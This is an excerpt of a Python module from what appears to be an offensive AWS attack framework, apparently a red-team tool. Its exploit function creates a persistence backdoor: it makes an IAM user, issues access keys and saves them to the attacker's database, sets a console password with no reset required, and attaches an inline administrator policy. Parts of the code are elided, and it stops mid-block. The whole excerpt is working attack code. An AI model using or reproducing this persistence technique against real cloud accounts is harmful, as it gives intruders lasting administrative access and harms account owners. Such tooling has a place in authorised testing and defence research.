# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\persistence\aws_iam_create_admin_user.py
import json
import random
import string
...
def exploit(profile, workspace):
    ...
    try:
        profile.create_user(UserName=user)
    ...
    try:
        ...
        try:
            awscredentials = AWSCredentials.objects.get(
                aws_access_key=json_data["aws_access_key"]
            )
            awscredentials.delete()
            awscredentials.save(**json_data)
            return_data["ProfileSaved"] = (
                f"Saved profile {json_data['aws_profile_name']} to Database"
            )
            ...
            return_data["ProfileSaved"] = (
                f"Error saving profile {json_data['aws_profile_name']} to Database: {str(e)}"
            )

        return_data["AccessKeyStatus"] = (
            f"Credentials {response['AccessKey']['AccessKeyId']}:{response['AccessKey']['SecretAccessKey']} Created"
        )
    except Exception as e:
        return_data["AccessKeyStatus"] = (
            f"Error creating credentials for user: {str(e)}"
        )
    ...
    if createLP.lower() != "true":
        try:
            ...
            profile.create_login_profile(
                UserName=user, Password=password, PasswordResetRequired=False
            )
            return_data["LoginProfileStatus"] = (
                f"Created Login profile with password {password}"
            )
        except Exception as e:
            return_data["Login Profile"] = (
                f"Error creating login profile for user: {str(e)}"
            )

    try:
        profile.put_user_policy(
            UserName=user, PolicyName="AdminPolicy", PolicyDocument=policyDoc
        )
        return_data["AdminPolicyStatus"] = f"AdminPolicy was added to the user"
    except Exception as e:
